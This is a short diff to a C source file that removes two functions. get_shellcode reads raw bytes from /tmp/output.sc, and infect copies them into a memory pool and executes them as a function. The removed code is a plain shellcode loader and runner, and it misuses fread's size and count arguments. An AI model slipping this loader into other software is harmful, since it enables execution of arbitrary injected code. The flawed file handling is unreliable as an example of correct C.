@@ -42,49 +42,6 @@ destroy_pool(void)
     }
 }
 
-static unsigned
-get_shellcode(char **buf)
-{
-    FILE       *file = fopen("/tmp/output.sc", "rb");
-    unsigned    len;
-
-
-    fseek(file, 0L, SEEK_END);
-    len = ftell(file);
-
-    fclose(file);
-
-    file = fopen("/tmp/output.sc", "rb");
-
-    *buf = malloc(sizeof(char) * len);
-
-    fread(*buf, len, len, file);
-
-    fclose(file);
-
-    return len;
-}
-
-static void
-infect(void)
-{
-    char *buf = NULL;
-    unsigned len;
-
-
-    printf("[*] %s\n", __FUNCTION__);
-
-    len = get_shellcode(&buf);
-
-    memcpy(spawn_pool, buf, len);
-
-    void (*func)(void);
-
-    func = spawn_pool;
-
-    func();
-}
-
 static void
 spawn_loop(void)
 {
